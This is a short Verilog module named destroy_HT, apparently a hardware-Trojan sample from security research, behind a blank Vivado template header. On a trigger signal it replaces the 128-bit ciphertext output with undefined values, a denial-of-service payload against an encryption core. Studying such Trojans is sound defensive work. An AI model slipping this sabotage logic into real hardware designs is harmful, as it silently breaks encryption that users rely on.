`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 05/16/2024 03:54:14 PM
// Design Name: 
// Module Name: destroy_HT
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////


module destroy_HT(clk, destroy_trigger, ciphertext, trojan_out);
input clk;
input destroy_trigger;
input [127:0] ciphertext;
output reg [127:0] trojan_out;

always @(posedge clk) begin
    if (destroy_trigger)
        trojan_out <= 128'hX;
    else
        trojan_out <= ciphertext;
end
endmodule
